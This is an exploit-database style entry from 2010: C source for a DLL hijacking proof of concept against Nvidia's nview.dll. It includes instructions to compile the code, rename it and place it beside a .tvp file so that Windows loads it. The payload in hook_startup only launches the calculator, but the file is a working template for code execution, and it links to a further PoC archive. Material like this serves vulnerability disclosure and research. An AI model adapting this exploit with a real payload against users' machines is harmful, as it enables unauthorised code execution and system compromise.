/*
Nvidia Driver (nview.dll) Dll Hijacking Exploit
By: Encrypt3d.M!nd
Date: 25\8\2010
Download: http://www.nvidia.com/Download/index.aspx?lang=en-us

Details:
Compile the following code and rename it to nview.dll
and place file with one of the affected types in the same directory of the dll

Affected types: tvp

Code :(used the one from this
advisory:http://www.exploit-db.com/exploits/14758/):
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void hook_startup() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

// POC: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/nvidia-poc.rar
